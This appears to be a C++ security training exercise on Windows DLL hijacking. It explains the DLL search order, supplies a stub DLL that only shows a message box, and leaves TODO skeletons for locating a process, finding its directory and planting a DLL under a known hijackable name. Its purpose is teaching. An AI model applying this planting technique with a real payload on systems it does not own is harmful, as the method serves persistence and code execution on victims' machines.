/*
  Exercise 02 — DLL Hijacking
  ============================
  Windows DLL search order:
    1. The application's own directory
    2. System32, System, Windows, PATH directories ...

  If an application tries to LoadLibrary("missing.dll") and
  an attacker can write to the application's directory, they can
  plant a malicious DLL that gets loaded instead of the system one.

  This exercise walks through three steps:
    1. Find a running process by name
    2. Get its executable directory
    3. Drop a stub DLL (just MessageBoxA in DllMain) into that directory
       using a name the process is known to search for

  YOUR TASKS
  ----------
  1. Implement findTargetProcess() — use Toolhelp32 to locate a PID by name
  2. Implement getProcessDirectory() — get the full path of the process EXE,
     extract the directory portion
  3. Implement dropStubDLL() — write a minimal DLL source file into the target
     directory and print the compile command

  Compile:
    g++ -std=c++17 -Wall -o ex02.exe exercise_02_dll_hijack.cpp -ladvapi32

  WARNING: Only test against processes you own.
           Drop DLLs only in directories you own.
           Do NOT target system services.
*/

#include <windows.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <iostream>
#include <string>
#include <vector>

// Well-known hijackable DLL name used in our demo target (e.g. calc.exe → NTWDBLIB.DLL)
static const char* HIJACK_DLL_NAME = "NTWDBLIB.DLL";

// ─────────────────────────────────────────────────────────────────────────────
// Provided: stub DLL source code written into the target directory
// ─────────────────────────────────────────────────────────────────────────────
static const char* STUB_SOURCE =
    "#include <windows.h>\n"
    "BOOL WINAPI DllMain(HINSTANCE h, DWORD reason, LPVOID r) {\n"
    "    if (reason == DLL_PROCESS_ATTACH)\n"
    "        MessageBoxA(NULL, \"DLL Hijack Active\", \"Stub\", MB_OK);\n"
    "    return TRUE;\n"
    "}\n";

// ─────────────────────────────────────────────────────────────────────────────
// TODO 1 — findTargetProcess
//   Use CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) to enumerate processes.
//   Find the process whose szExeFile matches processName (case-insensitive).
//   Return its th32ProcessID, or 0 if not found.
//
//   Hint:
//     PROCESSENTRY32 pe32 = { sizeof(pe32) };
//     HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
//     if (Process32First(snap, &pe32)) do { ... } while (Process32Next(snap, &pe32));
//     CloseHandle(snap);
// ─────────────────────────────────────────────────────────────────────────────
DWORD findTargetProcess(const std::string& processName) {
    // TODO: implement snapshot + Process32First/Next loop
    (void)processName;
    return 0;
}

// ─────────────────────────────────────────────────────────────────────────────
// TODO 2 — getProcessDirectory
//   Given a PID, open the process with PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
//   call GetModuleFileNameExA (from psapi.h) to get the full exe path,
//   then strip the filename to get just the directory.
//   Returns the directory string, or "" on failure.
//
//   Hint:
//     HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
//     char buf[MAX_PATH];
//     GetModuleFileNameExA(hProc, NULL, buf, MAX_PATH);
//     std::string path(buf);
//     return path.substr(0, path.rfind('\\'));
//   Link: -lpsapi
// ─────────────────────────────────────────────────────────────────────────────
std::string getProcessDirectory(DWORD pid) {
    // TODO: implement
    (void)pid;
    return "";
}

// ─────────────────────────────────────────────────────────────────────────────
// TODO 3 — dropStubDLL
//   Write STUB_SOURCE into <targetDir>\stub_dllmain.cpp.
//   Compute <targetDir>\<HIJACK_DLL_NAME> as the output DLL path.
//   Print: "Written: <source_path>"
//   Print: "Compile: g++ -std=c++17 -shared -o <dll_path> <source_path>"
//
//   Use CreateFileA / WriteFile / CloseHandle.
// ─────────────────────────────────────────────────────────────────────────────
bool dropStubDLL(const std::string& targetDir) {
    // TODO: build sourcePath = targetDir + "\\stub_dllmain.cpp"
    // TODO: CreateFileA(sourcePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, ...)
    // TODO: WriteFile with STUB_SOURCE content
    // TODO: CloseHandle
    // TODO: print written path and compile command
    (void)targetDir;
    return false;
}

// ─────────────────────────────────────────────────────────────────────────────
int main(int argc, char* argv[]) {
    std::cout << "=== Exercise 02: DLL Hijack Persistence ===\n\n";

    // Default target — notepad.exe is safe and easy to launch for testing
    std::string target = (argc > 1) ? argv[1] : "notepad.exe";
    std::cout << "Target process : " << target << "\n\n";

    // Step 1 — find PID
    std::cout << "[1] Locating process ...\n";
    DWORD pid = findTargetProcess(target);
    if (pid == 0) {
        std::cout << "    Not found. Launch '" << target
                  << "' first, then re-run.\n";
        return 1;
    }
    std::cout << "    PID = " << pid << "\n\n";

    // Step 2 — get directory
    std::cout << "[2] Getting process directory ...\n";
    std::string dir = getProcessDirectory(pid);
    if (dir.empty()) {
        std::cout << "    Failed (complete TODO 2).\n";
        return 1;
    }
    std::cout << "    Directory: " << dir << "\n\n";

    // Step 3 — drop stub
    std::cout << "[3] Dropping stub DLL source ...\n";
    if (dropStubDLL(dir))
        std::cout << "    Done.\n";
    else
        std::cout << "    Failed (complete TODO 3).\n";

    return 0;
}
